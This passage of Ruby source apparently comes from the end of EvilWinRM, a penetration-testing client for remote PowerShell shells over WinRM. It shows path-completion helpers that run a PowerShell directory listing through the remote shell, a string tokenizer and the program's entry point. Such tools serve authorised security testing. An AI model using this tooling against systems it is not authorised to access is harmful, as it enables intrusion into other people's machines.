    def get_dir_parts(n_path)
        return [n_path, "" ] if !!(n_path[-1] =~ /\/$/)
        i_last = n_path.rindex('/')
        if i_last.nil?
            return ["./", n_path]
        end

        next_i = i_last + 1
        amount = n_path.length() - next_i

        return [n_path[0, i_last + 1], n_path[next_i, amount]]
    end

    def complete_path(str, shell)
        if @completion_enabled then
            if !str.empty? && !!(str =~ /^(\.\/|[a-z,A-Z]\:|\.\.\/|\~\/|\/)*/i) then
                n_path = str
                parts = self.get_dir_parts(n_path)
                dir_p = parts[0]
                nam_p = parts[1]
                result = []
                result = self.get_from_cache(dir_p) unless dir_p =~ /^(\.\/|\.\.\/|\~|\/)/

                if result.nil? || result.empty? then
                    target_dir = dir_p
                    pscmd = "$a=@();$(ls '#{target_dir}*' -ErrorAction SilentlyContinue -Force |Foreach-Object {  if((Get-Item $_.FullName -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo] ){ $a +=  \"$($_.FullName.Replace('\\','/'))/\"}else{  $a += \"$($_.FullName.Replace('\\', '/'))\" } });$a += \"$($(Resolve-Path -Path '#{target_dir}').Path.Replace('\\','/'))\";$a"

                    output = shell.run(pscmd).output
                    s = output.to_s.gsub(/\r/, '').split(/\n/)

                    dir_p = s.pop
                    self.set_cache(dir_p, s)
                    result = s
                end
                dir_p = dir_p + "/" unless dir_p[-1] == "/"
                path_grep = self.normalize_path(dir_p + nam_p)
                path_grep = path_grep.chop() if !path_grep.empty? && path_grep[0] == "\""
                filtered = result.grep(/^#{path_grep}/i)
                return filtered.collect{ |x| "\"#{x}\"" }
            end
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
